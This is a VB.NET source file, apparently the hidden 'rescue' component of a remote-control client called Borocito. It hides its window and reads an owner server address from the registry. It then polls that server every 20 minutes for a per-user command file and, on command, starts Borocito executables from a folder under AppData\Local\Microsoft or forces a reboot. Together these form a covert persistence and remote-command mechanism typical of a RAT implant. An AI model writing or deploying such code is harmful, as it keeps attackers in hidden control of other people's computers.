Imports Microsoft.Win32
Public Class Init
    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Dim UID As String
    Dim threadReader As Threading.Thread
    Dim lastCommand As String
    Dim HttpOwnerServer As String
    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            LoadRegedit()
            CheckForIllegalCrossThreadCalls = False
            threadReader = New Threading.Thread(AddressOf ReadingCommand)
            threadReader.Start()
            Me.Hide()
        Catch ex As Exception
            Console.WriteLine("[Init_Load@Init]Error: " & ex.Message)
        End Try
    End Sub

    Sub ReadingCommand()
        Try
            While True
                Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]broRescue.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                ReadCommand()
                Threading.Thread.Sleep(1200000) '20 minutos
            End While
        Catch ex As Exception
            Console.WriteLine("[ReadingCommand@Init]Error: " & ex.Message)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            UID = regKey.GetValue("UID")
            HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
        Catch ex As Exception
            Console.WriteLine("[LoadRegedit@Init]Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub ReadCommand()
        Try
            Dim filePath As String = DIRCommons & "\[" & UID & "]broRescue.str"
            Dim commandOne As String = IO.File.ReadAllLines(filePath)(1).Split(">"c)(1).Trim()
            If commandOne <> Nothing Then
                If lastCommand <> commandOne Then
                    If commandOne.StartsWith("broRescue") Then
                        Try
                            If commandOne.Contains("Borocito") Then
                                Process.Start(DIRCommons & "\Borocito.exe")
                            ElseIf commandOne.Contains("Extractor") Then
                                Process.Start(DIRCommons & "\BorocitoExtractor.exe")
                            ElseIf commandOne.Contains("Updater") Then
                                Process.Start(DIRCommons & "\BorocitoUpdater.exe")
                            ElseIf commandOne.Contains("Restart") Then
                                Process.Start("shutdown.exe", "/r")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[ReadCommand(0)@Init]Error: " & ex.Message)
                        End Try
                    End If
                    lastCommand = commandOne
                End If
            End If
        Catch ex As Exception
            Console.WriteLine("[ReadCommand@Init]Error: " & ex.Message)
        End Try
    End Sub
End Class